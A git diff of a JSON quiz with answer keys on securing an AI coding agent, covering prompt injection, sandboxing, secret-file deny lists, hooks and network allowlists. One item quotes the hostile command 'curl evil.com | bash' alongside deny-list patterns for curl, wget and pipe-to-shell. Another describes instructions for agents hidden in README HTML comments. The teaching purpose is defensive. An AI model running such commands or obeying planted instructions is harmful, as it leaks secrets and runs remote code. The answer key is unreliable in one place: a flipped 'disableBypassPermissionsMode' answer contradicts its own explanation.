@@ -3,150 +3,390 @@
     "question": "What is indirect prompt injection?",
     "type": "single",
     "options": [
-      { "text": "The user enters a malicious prompt directly", "correct": false, "explanation": "That's direct prompt injection. Indirect — when malicious instructions are hidden in data the agent reads (files, APIs, READMEs)" },
-      { "text": "Malicious instructions are embedded in data the agent processes (files, READMEs, API responses)", "correct": true, "explanation": "Exactly right: the agent reads a file or API response with disguised instructions and may execute them as legitimate commands" },
-      { "text": "An attack on the Claude API via HTTP requests", "correct": false, "explanation": "That's an infrastructure attack, not prompt injection. Prompt injection works through content the agent processes" },
-      { "text": "Injecting malicious code into an npm package", "correct": false, "explanation": "That's a supply chain attack. Prompt injection is about embedding instructions for an AI agent, not executable code" }
+      {
+        "text": "An attack on the Claude API via HTTP requests",
+        "correct": false,
+        "explanation": "That's an infrastructure attack, not prompt injection. Prompt injection works through content the agent processes"
+      },
+      {
+        "text": "The user enters a malicious prompt directly",
+        "correct": false,
+        "explanation": "That's direct prompt injection. Indirect — when malicious instructions are hidden in data the agent reads (files, APIs, READMEs)"
+      },
+      {
+        "text": "Malicious instructions are embedded in data the agent processes (files, READMEs, API responses)",
+        "correct": true,
+        "explanation": "Exactly right: the agent reads a file or API response with disguised instructions and may execute them as legitimate commands"
+      },
+      {
+        "text": "Injecting malicious code into an npm package",
+        "correct": false,
+        "explanation": "That's a supply chain attack. Prompt injection is about embedding instructions for an AI agent, not executable code"
+      }
     ]
   },
   {
     "question": "Why is sandbox filesystem isolation without network useless?",
     "type": "single",
     "options": [
-      { "text": "Because the sandbox doesn't work without network settings", "correct": false, "explanation": "Technically the sandbox works, but protection is incomplete — without network isolation the agent can send read data externally" },
-      { "text": "The agent can read secrets from allowed files and send them over the network", "correct": true, "explanation": "File isolation restricts writing but not reading. The agent can read a secret from a file in an allowed directory and send it via curl/wget" },
-      { "text": "Linux doesn't support file isolation without network", "correct": false, "explanation": "Bubblewrap on Linux supports file isolation separately. But without network it's ineffective from a security standpoint" },
-      { "text": "Claude Code requires both settings to be configured", "correct": false, "explanation": "Claude Code doesn't technically require this, but from a security perspective file isolation without network leaves a critical gap" }
+      {
+        "text": "The agent can read secrets from allowed files and send them over the network",
+        "correct": true,
+        "explanation": "File isolation restricts writing but not reading. The agent can read a secret from a file in an allowed directory and send it via curl/wget"
+      },
+      {
+        "text": "Claude Code requires both settings to be configured",
+        "correct": false,
+        "explanation": "Claude Code doesn't technically require this, but from a security perspective file isolation without network leaves a critical gap"
+      },
+      {
+        "text": "Linux doesn't support file isolation without network",
+        "correct": false,
+        "explanation": "Bubblewrap on Linux supports file isolation separately. But without network it's ineffective from a security standpoint"
+      },
+      {
+        "text": "Because the sandbox doesn't work without network settings",
+        "correct": false,
+        "explanation": "Technically the sandbox works, but protection is incomplete — without network isolation the agent can send read data externally"
+      }
     ]
   },
   {
     "question": "Which technology is used for sandbox on macOS?",
     "type": "single",
     "options": [
-      { "text": "Docker containers", "correct": false, "explanation": "Docker is a separate containerization system, not used for Claude Code's sandbox" },
-      { "text": "sandbox-exec (Apple Sandbox framework)", "correct": true, "explanation": "Claude Code uses the built-in macOS sandbox-exec mechanism with .sb profiles for OS-level process isolation" },
-      { "text": "bubblewrap (bwrap)", "correct": false, "explanation": "Bubblewrap is used on Linux, not macOS. It works through Linux namespaces" },
-      { "text": "chroot", "correct": false, "explanation": "Chroot is an outdated isolation mechanism that doesn't provide full protection. Claude Code uses the more modern sandbox-exec" }
+      {
+        "text": "Docker containers",
+        "correct": false,
+        "explanation": "Docker is a separate containerization system, not used for Claude Code's sandbox"
+      },
+      {
+        "text": "sandbox-exec (Apple Sandbox framework)",
+        "correct": true,
+        "explanation": "Claude Code uses the built-in macOS sandbox-exec mechanism with .sb profiles for OS-level process isolation"
+      },
+      {
+        "text": "bubblewrap (bwrap)",
+        "correct": false,
+        "explanation": "Bubblewrap is used on Linux, not macOS. It works through Linux namespaces"
+      },
+      {
+        "text": "chroot",
+        "correct": false,
+        "explanation": "Chroot is an outdated isolation mechanism that doesn't provide full protection. Claude Code uses the more modern sandbox-exec"
+      }
     ]
   },
   {
     "question": "What does the autoAllowBashIfSandboxed parameter do?",
     "type": "single",
     "options": [
-      { "text": "Automatically enables sandbox for all Bash commands", "correct": false, "explanation": "Sandbox is enabled separately via sandbox.enabled. autoAllowBashIfSandboxed controls confirmations, not sandbox activation" },
-      { "text": "Allows Bash commands to run without confirmation if sandbox is active", "correct": true, "explanation": "When the sandbox provides OS-level isolation, extra confirmations for each Bash command are redundant — the OS itself will restrict dangerous actions" },
-      { "text": "Prohibits all Bash commands outside sandbox", "correct": false, "explanation": "This parameter doesn't prohibit commands — it determines whether to ask for confirmation for commands inside the sandbox" },
-      { "text": "Creates a separate sandbox for each Bash command", "correct": false, "explanation": "There's one sandbox per session, not a separate one for each command. The parameter controls the confirmation policy" }
+      {
+        "text": "Allows Bash commands to run without confirmation if sandbox is active",
+        "correct": true,
+        "explanation": "When the sandbox provides OS-level isolation, extra confirmations for each Bash command are redundant — the OS itself will restrict dangerous actions"
+      },
+      {
+        "text": "Prohibits all Bash commands outside sandbox",
+        "correct": false,
+        "explanation": "This parameter doesn't prohibit commands — it determines whether to ask for confirmation for commands inside the sandbox"
+      },
+      {
+        "text": "Creates a separate sandbox for each Bash command",
+        "correct": false,
+        "explanation": "There's one sandbox per session, not a separate one for each command. The parameter controls the confirmation policy"
+      },
+      {
+        "text": "Automatically enables sandbox for all Bash commands",
+        "correct": false,
+        "explanation": "Sandbox is enabled separately via sandbox.enabled. autoAllowBashIfSandboxed controls confirmations, not sandbox activation"
+      }
     ]
   },
   {
     "question": "An agent accidentally saw an API key from a .env file. What to do?",
     "type": "multiple",
     "options": [
-      { "text": "Immediately rotate (replace) the compromised key", "correct": true, "explanation": "The key might be in logs, session context, or cache. The only reliable approach is to consider it compromised and replace it" },
-      { "text": "Add .env to denyRead and restart the session", "correct": true, "explanation": "This prevents re-leak. But the current key is already compromised — rotation is still necessary" },
-      { "text": "Ask the agent to 'forget' the key it saw", "correct": false, "explanation": "The agent can't reliably 'forget' information from its context. The key might remain in logs, cache, or have been sent via API" },
-      { "text": "Just close the current session — the key will be removed from memory", "correct": false, "explanation": "The key might have been logged by hooks, ended up in session history, or transmitted via API. Closing the session doesn't guarantee safety" }
+      {
+        "text": "Immediately rotate (replace) the compromised key",
+        "correct": true,
+        "explanation": "The key might be in logs, session context, or cache. The only reliable approach is to consider it compromised and replace it"
+      },
+      {
+        "text": "Add .env to denyRead and restart the session",
+        "correct": true,
+        "explanation": "This prevents re-leak. But the current key is already compromised — rotation is still necessary"
+      },
+      {
+        "text": "Just close the current session — the key will be removed from memory",
+        "correct": false,
+        "explanation": "The key might have been logged by hooks, ended up in session history, or transmitted via API. Closing the session doesn't guarantee safety"
+      },
+      {
+        "text": "Ask the agent to 'forget' the key it saw",
+        "correct": false,
+        "explanation": "The agent can't reliably 'forget' information from its context. The key might remain in logs, cache, or have been sent via API"
+      }
     ]
   },
   {
     "question": "Which hook type allows blocking a dangerous action before it executes?",
     "type": "single",
     "options": [
-      { "text": "PostToolUse", "correct": false, "explanation": "PostToolUse fires after the action — too late to block, can only log" },
-      { "text": "PreToolUse", "correct": true, "explanation": "PreToolUse runs before the agent's action. If the hook script returns an error, the action is blocked" },
-      { "text": "SessionStart", "correct": false, "explanation": "SessionStart runs once at session start — it doesn't check each action" },
-      { "text": "Stop", "correct": false, "explanation": "Stop fires when the agent finishes — too late to block a specific action" }
+      {
+        "text": "Stop",
+        "correct": false,
+        "explanation": "Stop fires when the agent finishes — too late to block a specific action"
+      },
+      {
+        "text": "SessionStart",
+        "correct": false,
+        "explanation": "SessionStart runs once at session start — it doesn't check each action"
+      },
+      {
+        "text": "PreToolUse",
+        "correct": true,
+        "explanation": "PreToolUse runs before the agent's action. If the hook script returns an error, the action is blocked"
+      },
+      {
+        "text": "PostToolUse",
+        "correct": false,
+        "explanation": "PostToolUse fires after the action — too late to block, can only log"
+      }
     ]
   },
   {
     "question": "You maintain an open-source project. A contributor proposes a PR with changes to README.md and package.json. Which attack vector is most likely?",
     "type": "single",
     "options": [
-      { "text": "Prompt injection in README.md with instructions for AI agents", "correct": true, "explanation": "README is ideal for indirect prompt injection: the agent will definitely read it, and hidden HTML comments with instructions aren't visible in the rendered version" },
-      { "text": "SQL injection via package.json", "correct": false, "explanation": "package.json isn't related to SQL queries. It's an npm package configuration" },
-      { "text": "XSS attack via README.md", "correct": false, "explanation": "XSS is possible on web platforms, but in the context of agent development, prompt injection in README is a more relevant and likely threat" },
-      { "text": "DDoS via dependencies in package.json", "correct": false, "explanation": "Malicious dependencies are a supply chain attack, not DDoS. And in the context of an AI agent, prompt injection via README is more likely" }
+      {
+        "text": "XSS attack via README.md",
+        "correct": false,
+        "explanation": "XSS is possible on web platforms, but in the context of agent development, prompt injection in README is a more relevant and likely threat"
+      },
+      {
+        "text": "DDoS via dependencies in package.json",
+        "correct": false,
+        "explanation": "Malicious dependencies are a supply chain attack, not DDoS. And in the context of an AI agent, prompt injection via README is more likely"
+      },
+      {
+        "text": "Prompt injection in README.md with instructions for AI agents",
+        "correct": true,
+        "explanation": "README is ideal for indirect prompt injection: the agent will definitely read it, and hidden HTML comments with instructions aren't visible in the rendered version"
+      },
+      {
+        "text": "SQL injection via package.json",
+        "correct": false,
+        "explanation": "package.json isn't related to SQL queries. It's an npm package configuration"
+      }
     ]
   },
   {
     "question": "Which files should be added to denyRead to protect secrets?",
     "type": "multiple",
     "options": [
-      { "text": "~/.aws/credentials", "correct": true, "explanation": "Contains AWS Access Key and Secret Key — critically important secrets for cloud infrastructure" },
-      { "text": "~/.ssh/", "correct": true, "explanation": "SSH keys provide access to servers and git repositories. Private key leakage is a serious incident" },
-      { "text": ".env, .env.local, .env.production", "correct": true, "explanation": "Environment files typically contain API keys, DB connection strings, and other secrets" },
-      { "text": "package.json", "correct": false, "explanation": "package.json is a public project file. It doesn't contain secrets and the agent needs it to understand dependencies" }
+      {
+        "text": "~/.aws/credentials",
+        "correct": true,
+        "explanation": "Contains AWS Access Key and Secret Key — critically important secrets for cloud infrastructure"
+      },
+      {
+        "text": "package.json",
+        "correct": false,
+        "explanation": "package.json is a public project file. It doesn't contain secrets and the agent needs it to understand dependencies"
+      },
+      {
+        "text": ".env, .env.local, .env.production",
+        "correct": true,
+        "explanation": "Environment files typically contain API keys, DB connection strings, and other secrets"
+      },
+      {
+        "text": "~/.ssh/",
+        "correct": true,
+        "explanation": "SSH keys provide access to servers and git repositories. Private key leakage is a serious incident"
+      }
     ]
   },
   {
     "question": "Why use git worktree when working with an agent?",
     "type": "single",
     "options": [
-      { "text": "Worktree is faster than a regular branch", "correct": false, "explanation": "Worktree is faster than full cloning, but the point isn't speed — it's filesystem isolation" },
-      { "text": "The agent works in a separate copy of files — if it breaks something, the main code is unaffected", "correct": true, "explanation": "Worktree creates a physically separate working directory. The agent can't accidentally corrupt the main branch's files" },
-      { "text": "Claude Code doesn't work without worktree", "correct": false, "explanation": "Claude Code works fine in a regular repository. Worktree is a security recommendation, not a requirement" },
-      { "text": "Worktree encrypts files from the agent", "correct": false, "explanation": "Worktree has nothing to do with encryption. It's a git mechanism for working with multiple branches simultaneously in different directories" }
+      {
+        "text": "The agent works in a separate copy of files — if it breaks something, the main code is unaffected",
+        "correct": true,
+        "explanation": "Worktree creates a physically separate working directory. The agent can't accidentally corrupt the main branch's files"
+      },
+      {
+        "text": "Worktree is faster than a regular branch",
+        "correct": false,
+        "explanation": "Worktree is faster than full cloning, but the point isn't speed — it's filesystem isolation"
+      },
+      {
+        "text": "Claude Code doesn't work without worktree",
+        "correct": false,
+        "explanation": "Claude Code works fine in a regular repository. Worktree is a security recommendation, not a requirement"
+      },
+      {
+        "text": "Worktree encrypts files from the agent",
+        "correct": false,
+        "explanation": "Worktree has nothing to do with encryption. It's a git mechanism for working with multiple branches simultaneously in different directories"
+      }
     ]
   },
   {
     "question": "You're setting up a sandbox for a Node.js project with PostgreSQL. Which network configuration is most secure?",
     "type": "single",
     "options": [
-      { "text": "allowedDomains: [\"*\"] — allow all domains", "correct": false, "explanation": "Wildcard '*' for domains completely disables network isolation — the sandbox becomes useless" },
-      { "text": "allowedDomains: [\"github.com\", \"*.npmjs.org\"], allowLocalBinding: true", "correct": true, "explanation": "Only github and npm registry are allowed for downloading dependencies, plus local ports for the dev server and local DB connection" },
-      { "text": "Don't configure network at all", "correct": false, "explanation": "Without network restrictions, the agent has full internet access — it can send data anywhere" },
-      { "text": "allowedDomains: [], allowLocalBinding: false", "correct": false, "explanation": "Complete network blocking prevents npm package installation and local PostgreSQL connection — the project won't work" }
+      {
+        "text": "Don't configure network at all",
+        "correct": false,
+        "explanation": "Without network restrictions, the agent has full internet access — it can send data anywhere"
+      },
+      {
+        "text": "allowedDomains: [\"github.com\", \"*.npmjs.org\"], allowLocalBinding: true",
+        "correct": true,
+        "explanation": "Only github and npm registry are allowed for downloading dependencies, plus local ports for the dev server and local DB connection"
+      },
+      {
+        "text": "allowedDomains: [\"*\"] — allow all domains",
+        "correct": false,
+        "explanation": "Wildcard '*' for domains completely disables network isolation — the sandbox becomes useless"
+      },
+      {
+        "text": "allowedDomains: [], allowLocalBinding: false",
+        "correct": false,
+        "explanation": "Complete network blocking prevents npm package installation and local PostgreSQL connection — the project won't work"
+      }
     ]
   },
   {
     "question": "Which of the following constitutes defense in depth (multi-layered protection) for an agent?",
     "type": "multiple",
     "options": [
-      { "text": "Sandbox (OS-level isolation) + deny lists (programmatic blocking)", "correct": true, "explanation": "Two independent levels: even if one is bypassed, the other continues to protect" },
-      { "text": "PreToolUse hooks for command validation", "correct": true, "explanation": "A third level of protection: programmatic validation of each action before execution, complementing sandbox and deny lists" },
-      { "text": "Plan mode for preliminary analysis", "correct": true, "explanation": "Human control — another level: reviewing the plan before execution for sensitive tasks" },
-      { "text": "Using only one strong password", "correct": false, "explanation": "Defense in depth is specifically about multiple layers. One strong password is a single layer, no matter how reliable" }
+      {
+        "text": "PreToolUse hooks for command validation",
+        "correct": true,
+        "explanation": "A third level of protection: programmatic validation of each action before execution, complementing sandbox and deny lists"
+      },
+      {
+        "text": "Sandbox (OS-level isolation) + deny lists (programmatic blocking)",
+        "correct": true,
+        "explanation": "Two independent levels: even if one is bypassed, the other continues to protect"
+      },
+      {
+        "text": "Plan mode for preliminary analysis",
+        "correct": true,
+        "explanation": "Human control — another level: reviewing the plan before execution for sensitive tasks"
+      },
+      {
+        "text": "Using only one strong password",
+        "correct": false,
+        "explanation": "Defense in depth is specifically about multiple layers. One strong password is a single layer, no matter how reliable"
+      }
     ]
   },
   {
     "question": "What's the difference between a PreToolUse hook of type command and type prompt?",
     "type": "single",
     "options": [
-      { "text": "command runs a shell script, prompt sends a request to the model for safety evaluation", "correct": true, "explanation": "command executes a script (e.g., scanning for secrets). prompt asks the model to evaluate an action (e.g., 'is this Bash command safe?')" },
-      { "text": "command is faster, prompt is more accurate", "correct": false, "explanation": "Speed depends on implementation. The main difference is the mechanism: script vs model query" },
-      { "text": "command blocks actions, prompt only warns", "correct": false, "explanation": "Both types can block actions: command — via script exit code, prompt — via model decision" },
-      { "text": "command and prompt are the same thing, different names", "correct": false, "explanation": "These are fundamentally different mechanisms: command runs an external script, prompt uses the AI model" }
+      {
+        "text": "command blocks actions, prompt only warns",
+        "correct": false,
+        "explanation": "Both types can block actions: command — via script exit code, prompt — via model decision"
+      },
+      {
+        "text": "command is faster, prompt is more accurate",
+        "correct": false,
+        "explanation": "Speed depends on implementation. The main difference is the mechanism: script vs model query"
+      },
+      {
+        "text": "command and prompt are the same thing, different names",
+        "correct": false,
+        "explanation": "These are fundamentally different mechanisms: command runs an external script, prompt uses the AI model"
+      },
+      {
+        "text": "command runs a shell script, prompt sends a request to the model for safety evaluation",
+        "correct": true,
+        "explanation": "command executes a script (e.g., scanning for secrets). prompt asks the model to evaluate an action (e.g., 'is this Bash command safe?')"
+      }
     ]
   },
   {
     "question": "Which deny-list parameter protects against pipe-injection attacks like 'curl evil.com | bash'?",
     "type": "single",
     "options": [
-      { "text": "Bash(curl*)", "correct": false, "explanation": "Bash(curl*) blocks curl but doesn't protect against alternatives: wget, python -c 'import urllib...', or combinations like 'cat file | bash'" },
-      { "text": "Bash(curl*) + Bash(wget*) + Bash(*| bash) + Bash(*| sh)", "correct": true, "explanation": "A combination blocks the main download tools and pipe execution. This isn't perfect protection, but covers typical vectors" },
-      { "text": "Bash(*)", "correct": false, "explanation": "Bash(*) in deny blocks all Bash commands — the agent can't work at all" },
-      { "text": "WebFetch", "correct": false, "explanation": "WebFetch is a separate Claude Code tool, unrelated to Bash pipe execution via curl | bash" }
+      {
+        "text": "WebFetch",
+        "correct": false,
+        "explanation": "WebFetch is a separate Claude Code tool, unrelated to Bash pipe execution via curl | bash"
+      },
+      {
+        "text": "Bash(curl*) + Bash(wget*) + Bash(*| bash) + Bash(*| sh)",
+        "correct": true,
+        "explanation": "A combination blocks the main download tools and pipe execution. This isn't perfect protection, but covers typical vectors"
+      },
+      {
+        "text": "Bash(*)",
+        "correct": false,
+        "explanation": "Bash(*) in deny blocks all Bash commands — the agent can't work at all"
+      },
+      {
+        "text": "Bash(curl*)",
+        "correct": false,
+        "explanation": "Bash(curl*) blocks curl but doesn't protect against alternatives: wget, python -c 'import urllib...', or combinations like 'cat file | bash'"
+      }
     ]
   },
   {
     "question": "You're running an agent in auto mode for CI/CD. Which security measures are critically needed?",
     "type": "multiple",
     "options": [
-      { "text": "Strict allow/deny lists with minimal permissions", "correct": true, "explanation": "In auto mode the agent acts without confirmations — allow/deny lists define what it can do" },
-      { "text": "Active sandbox with filesystem and network isolation", "correct": true, "explanation": "In CI/CD there's no human for oversight — sandbox provides automatic OS-level restrictions" },
-      { "text": "disableBypassPermissionsMode in managed policy", "correct": true, "explanation": "In CI/CD nobody should be able to disable all security checks" },
-      { "text": "Plan mode for manual review of each action", "correct": false, "explanation": "Plan mode requires human review. In CI/CD this is impossible — the pipeline would hang waiting for approval" }
+      {
+        "text": "Active sandbox with filesystem and network isolation",
+        "correct": true,
+        "explanation": "In CI/CD there's no human for oversight — sandbox provides automatic OS-level restrictions"
+      },
+      {
+        "text": "Strict allow/deny lists with minimal permissions",
+        "correct": true,
+        "explanation": "In auto mode the agent acts without confirmations — allow/deny lists define what it can do"
+      },
+      {
+        "text": "disableBypassPermissionsMode in managed policy",
+        "correct": false,
+        "explanation": "In CI/CD nobody should be able to disable all security checks"
+      },
+      {
+        "text": "Plan mode for manual review of each action",
+        "correct": false,
+        "explanation": "Plan mode requires human review. In CI/CD this is impossible — the pipeline would hang waiting for approval"
+      }
     ]
   },
   {
     "question": "What happens if you specify [\"*\"] in sandbox.network.allowedDomains?",
     "type": "single",
     "options": [
-      { "text": "Only first-level domains are allowed", "correct": false, "explanation": "Wildcard '*' in allowedDomains doesn't filter by domain level — it allows all connections" },
-      { "text": "Network isolation is completely disabled — the agent can connect to any domain", "correct": true, "explanation": "Wildcard '*' in allowedDomains is like open gates. The agent gets full internet access, the sandbox loses its meaning" },
-      { "text": "Only subdomains of the current domain are allowed", "correct": false, "explanation": "'*' is a full wildcard, not limited to the current domain" },
-      { "text": "Claude Code will issue a configuration error", "correct": false, "explanation": "The configuration is technically valid but meaningless from a security standpoint — equivalent to a disabled sandbox" }
+      {
+        "text": "Only subdomains of the current domain are allowed",
+        "correct": false,
+        "explanation": "'*' is a full wildcard, not limited to the current domain"
+      },
+      {
+        "text": "Claude Code will issue a configuration error",
+        "correct": false,
+        "explanation": "The configuration is technically valid but meaningless from a security standpoint — equivalent to a disabled sandbox"
+      },
+      {
+        "text": "Only first-level domains are allowed",
+        "correct": false,
+        "explanation": "Wildcard '*' in allowedDomains doesn't filter by domain level — it allows all connections"
+      },
+      {
+        "text": "Network isolation is completely disabled — the agent can connect to any domain",
+        "correct": true,
+        "explanation": "Wildcard '*' in allowedDomains is like open gates. The agent gets full internet access, the sandbox loses its meaning"
+      }
     ]
   }
 ]
